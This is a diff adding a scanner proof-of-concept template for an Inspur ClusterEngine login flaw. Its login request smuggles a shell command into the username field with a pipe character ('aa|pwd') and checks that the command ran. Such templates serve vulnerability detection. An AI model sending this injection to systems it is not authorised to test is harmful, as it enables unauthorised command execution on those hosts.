@@ -1,0 +1,18 @@
+id: poc-yaml-inspur-clusterengine-anyuser-login
+info:
+  name: 浪潮ClusterEngine 任意用户登录漏洞
+  severity: medium
+  tags:
+  - 未授权访问
+  finger: 浪潮ClusterEngine
+  fofa: title="TSCEV4.0"
+requests:
+- method: POST
+  path: /login
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: op=login&username=aa%7Cpwd&password=123123
+  expression: status_code == 200 && contains(body,"\"out\":") && contains(body,"\"exitcode\":0")
+    && contains(content_type,"text/json")
+variables: {}
+transport: http
